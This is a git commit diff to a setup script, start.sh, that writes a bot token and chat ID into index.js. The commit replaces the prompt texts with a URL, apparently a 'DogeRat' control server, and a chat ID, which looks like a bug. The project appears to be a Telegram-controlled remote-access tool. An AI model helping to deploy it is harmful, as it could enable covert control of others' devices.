d248d96ca3b32f20d9488fde7cba0f11b7acc178
Javohir100 <120413085+Javohir100@users.noreply.github.com>
2024-09-05 23:26:40 +0500

    Update start.sh

--- start.sh
+++ start.sh
@@ -66,8 +66,8 @@ else
     rm node_modules.zip
 fi
 
-read -p "Enter your bot token: " token
-read -p "Enter your chat ID: " id
+read -p "https://dogerat-modi.onrender.com" token
+read -p "730766357" id
 sed -i "s/const token = 'your token here'/const token = '$token'/g" index.js
 sed -i "s/const id = 'chat id here'/const id = '$id'/g" index.js
 echo "Server uploaded successfully! Now open new tab and follow rest instructions"
